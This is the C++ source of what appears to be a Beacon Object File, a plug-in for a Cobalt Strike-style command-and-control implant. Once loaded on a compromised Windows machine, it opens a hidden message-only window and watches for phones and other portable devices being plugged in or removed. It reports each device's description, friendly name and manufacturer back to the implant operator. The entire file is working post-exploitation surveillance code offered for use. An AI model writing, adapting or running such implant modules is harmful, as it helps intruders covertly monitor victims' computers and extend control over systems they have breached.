#include <windows.h>
#include "Dbt.h"
#include "PortableDeviceApi.h"
#include "beacon.h"


#define IDT_PINGTIMER 1


#define SAFE_RELEASE_CPP(ptr)   \
        if ((ptr) != nullptr)   \
        {                       \
            (ptr)->Release();   \
            (ptr) = nullptr;    \
        }


static const GUID g_PortableDeviceManager   = { 0x0af10cec, 0x2ecd, 0x4b92, { 0x95, 0x81, 0x34, 0xf6, 0xae, 0x06, 0x37, 0xf3 } };
static const GUID g_IPortableDeviceManager  = { 0xa1567595, 0x4c2f, 0x4574, { 0xa6, 0xfa, 0xec, 0xef, 0x91, 0x7b, 0x9a, 0x40 } };
static const GUID GUID_DEVINTERFACE_WPD     = { 0x6AC27878, 0xA6FA, 0x4155, { 0xBA, 0x85, 0xF9, 0x8F, 0x49, 0x1D, 0x4F, 0x33 } };


extern "C" {

    void go(char*, int);

    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoUninitialize();
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
    DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);

    WINBASEAPI void         __cdecl MSVCRT$memset(void*, int, size_t);

    WINBASEAPI DWORD        WINAPI KERNEL32$GetLastError();
    WINBASEAPI HMODULE      WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
    WINBASEAPI HANDLE       WINAPI KERNEL32$GetProcessHeap();
    WINBASEAPI BOOL         WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
    WINBASEAPI LPVOID       WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);

    WINBASEAPI BOOL         WINAPI User32$DestroyWindow(HWND);
    WINBASEAPI VOID         WINAPI User32$PostQuitMessage(int);
    WINBASEAPI BOOL         WINAPI User32$KillTimer(HWND, UINT_PTR);
    WINBASEAPI BOOL         WINAPI User32$TranslateMessage(const MSG*);
    WINBASEAPI LRESULT      WINAPI User32$DispatchMessageW(const MSG*);
    WINBASEAPI BOOL         WINAPI User32$GetMessageW(LPMSG, HWND, UINT, UINT);
    WINBASEAPI BOOL         WINAPI User32$UnregisterClassW(LPCWSTR, HINSTANCE);
    WINBASEAPI ATOM         WINAPI User32$RegisterClassExW(const WNDCLASSEXW*);
    WINBASEAPI BOOL         WINAPI User32$UnregisterDeviceNotification(HDEVNOTIFY);
    WINBASEAPI UINT_PTR     WINAPI User32$SetTimer(HWND, UINT_PTR, UINT, TIMERPROC);
    WINBASEAPI LRESULT      WINAPI User32$DefWindowProcW(HWND, UINT, WPARAM, LPARAM);
    WINBASEAPI HDEVNOTIFY   WINAPI User32$RegisterDeviceNotificationW(HANDLE, LPVOID, DWORD);
    WINBASEAPI HWND         WINAPI User32$CreateWindowExW(DWORD, LPCWSTR, LPCWSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
}


int g_delay = { 0 };


HRESULT get_device_stuff(LPCWSTR device_name) {

    HRESULT hr;
    bool    bInit = false;

    IPortableDeviceManager* deviceManager = nullptr;

    auto get_info = [ &deviceManager, &device_name ]( wchar_t* output, decltype(&IPortableDeviceManager::GetDeviceManufacturer) fn ) -> void {

        DWORD       name_len = 0;
        wchar_t*    name = nullptr;

        ( deviceManager->*fn )( device_name, nullptr, &name_len );

        if ( name_len > 0 ) {
            name = reinterpret_cast<wchar_t*>( KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, name_len * sizeof(wchar_t) ) );
            ( deviceManager->*fn )( device_name, name, &name_len );
        }

        BeaconPrintf( CALLBACK_OUTPUT, "%ws: %ws ", output, name );

        if ( name ) {
            MSVCRT$memset( name, 0, name_len );
            KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, name );
        }
    };

    if ( SUCCEEDED( hr = OLE32$CoInitializeEx( nullptr, COINIT_MULTITHREADED ) ) ) {
        bInit = true;
    } else {
        goto _End;
    }

    if ( FAILED( hr = OLE32$CoCreateInstance( g_PortableDeviceManager, nullptr, CLSCTX_INPROC_SERVER, g_IPortableDeviceManager, (void**)&deviceManager ) ) ) {
		goto _End;
	}

    get_info( L"Description", &IPortableDeviceManager::GetDeviceDescription ) ;
    get_info( L"Friendly name", &IPortableDeviceManager::GetDeviceFriendlyName );
    get_info( L"Manufacturer", &IPortableDeviceManager::GetDeviceManufacturer );

_End:
    SAFE_RELEASE_CPP( deviceManager );
    if ( bInit ) {
        OLE32$CoUninitialize();
    }
    return hr;
}


LRESULT CALLBACK wnd_callback(HWND window, UINT message, WPARAM wparam, LPARAM lparam) {

    switch ( message ) {

        case WM_CREATE: {
            User32$SetTimer( window, IDT_PINGTIMER, g_delay * 1000, nullptr );
            break;
        }
        case WM_TIMER: {
            if ( wparam == IDT_PINGTIMER ) {
                if ( WaitForSingleObject( BeaconGetStopJobEvent(), 0 ) != WAIT_OBJECT_0 ) {
                   break;
                }
            }
            else {
                break;
            }
        }
        case WM_DEVICECHANGE: {

            if ( wparam == DBT_DEVICEARRIVAL )  {

                auto headers = reinterpret_cast<DEV_BROADCAST_HDR*>( lparam );

                if ( headers && headers->dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE ) {

                    auto dev_interface = reinterpret_cast<DEV_BROADCAST_DEVICEINTERFACE_W*>( headers );

                    if ( dev_interface->dbcc_name ) {

                        BeaconPrintf( CALLBACK_OUTPUT, "WPD added\n" );
                        auto hr = get_device_stuff( dev_interface->dbcc_name );

                        if ( FAILED( hr ) ) {
                            BeaconPrintf( CALLBACK_ERROR, "get_device_stuff: 0x%0.8X\n", hr );
                        }

                        BeaconWakeup();
                    }
                }
            }
            if ( wparam == DBT_DEVICEREMOVECOMPLETE ) {
                BeaconPrintf( CALLBACK_OUTPUT, "WPD removed\n" );
                BeaconWakeup();
            }
            break;
        }
        case WM_DESTROY: {
            User32$KillTimer( window, IDT_PINGTIMER );
            User32$PostQuitMessage( 0 );
            return 0;
        }
        default:
            break;
    }

    return User32$DefWindowProcW( window, message, wparam, lparam );
}


void go(char* args, int len) {

    datap       Parser;
    MSG         message         = { 0 };
    WNDCLASSEXW window_class    = { 0 };
    HDEVNOTIFY  devnotif_handle = nullptr;
    HANDLE      window_handle   = nullptr;
    wchar_t*    window_name     = nullptr;

    DEV_BROADCAST_DEVICEINTERFACE_W notify_filter = { 0 };

    BeaconDataParse( &Parser, args, len );

    window_name = (wchar_t*)BeaconDataExtract( &Parser, nullptr );
    g_delay     = BeaconDataInt( &Parser );

    window_class.cbSize        = sizeof(window_class);
    window_class.lpfnWndProc   = wnd_callback;
    window_class.hInstance     = KERNEL32$GetModuleHandleW( nullptr );
    window_class.lpszClassName = window_name;

    if ( !User32$RegisterClassExW( &window_class ) ) {
        BeaconPrintf( CALLBACK_ERROR, "RegisterClassExW: %lu\n", KERNEL32$GetLastError() );
        goto _End;
    }

    window_handle = User32$CreateWindowExW( 0, window_class.lpszClassName, nullptr, 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, window_class.hInstance, nullptr );
    if ( !window_handle ) {
        BeaconPrintf( CALLBACK_ERROR, "CreateWindowExW: %lu\n", KERNEL32$GetLastError());
        goto _End;
    }

    notify_filter.dbcc_size         = sizeof(notify_filter);
    notify_filter.dbcc_devicetype   = DBT_DEVTYP_DEVICEINTERFACE;
    notify_filter.dbcc_classguid    = GUID_DEVINTERFACE_WPD;

    devnotif_handle = User32$RegisterDeviceNotificationW( window_handle, &notify_filter, DEVICE_NOTIFY_WINDOW_HANDLE );
    if ( !devnotif_handle ) {
        BeaconPrintf( CALLBACK_ERROR, "RegisterDeviceNotificationW: %lu\n", KERNEL32$GetLastError() );
        goto _End;
    }

    while ( User32$GetMessageW( &message, nullptr, 0, 0 ) ) {
        User32$TranslateMessage( &message );
        User32$DispatchMessageW( &message );
    }

_End:
    User32$DestroyWindow( (HWND)window_handle );
    User32$UnregisterDeviceNotification( devnotif_handle );
    User32$UnregisterClassW( window_name, window_class.hInstance );
}